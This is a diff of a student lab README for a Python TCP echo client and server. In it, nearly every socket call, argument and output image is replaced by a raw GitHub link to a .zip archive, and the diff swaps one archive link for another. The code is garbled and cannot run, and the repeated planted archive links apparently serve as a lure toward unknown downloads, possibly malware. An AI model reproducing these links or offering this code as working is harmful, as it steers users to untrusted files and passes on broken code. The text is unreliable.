@@ -1,4 +1,4 @@
-# https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip FOR ECHO CLIENT AND ECHO SERVER USING TCP SOCKETS
+# https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip FOR ECHO CLIENT AND ECHO SERVER USING TCP SOCKETS
 ## NAME :YUGABHARATHI M
 ## REGISTER NO:212224230314
 # AIM
@@ -19,21 +19,21 @@ import socket
 HOST = '127.0.0.1'  
 PORT = 65432        
 
-with https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip, https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip) as server_socket:
-    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip((HOST, PORT))
-    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip()
+with https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip, https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip) as server_socket:
+    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip((HOST, PORT))
+    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip()
 
     print(f"Server is listening on {HOST}:{PORT}")
     while True:
-        conn, addr = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip()
+        conn, addr = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip()
         with conn:
             print(f"Connected by {addr}")
             while True:
-                data = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip(1024)
+                data = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(1024)
                 if not data:
                     break
-                https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip(data)
-                print(f"Echoed: {https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip('utf-8')}")
+                https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(data)
+                print(f"Echoed: {https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip('utf-8')}")
 ```
 
 ### client:
@@ -44,21 +44,21 @@ import socket
 HOST = '127.0.0.1'  
 PORT = 65432  
 
-with https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip, https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip) as client_socket:
-    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip((HOST, PORT))
+with https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip, https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip) as client_socket:
+    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip((HOST, PORT))
 
     message = 'Hello, Server!'
-    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip('utf-8'))
+    https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip('utf-8'))
 
-    data = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip(1024)
-    print(f"Received echo: {https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip('utf-8')}")
+    data = https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip(1024)
+    print(f"Received echo: {https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip('utf-8')}")
 ```
 
 ## OUPUT
 
-![image](https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip)
 
-![image](https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/for-Client-and-a-Echo-Server-Sockets-Creation-v3.7.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/3a.Sockets_Creation_for_Echo_Client_and_Echo_Server/main/pseudogenus/a_Client_Server_Creation_and_Echo_Sockets_for_1.5.zip)
 
 
 ## RESULT
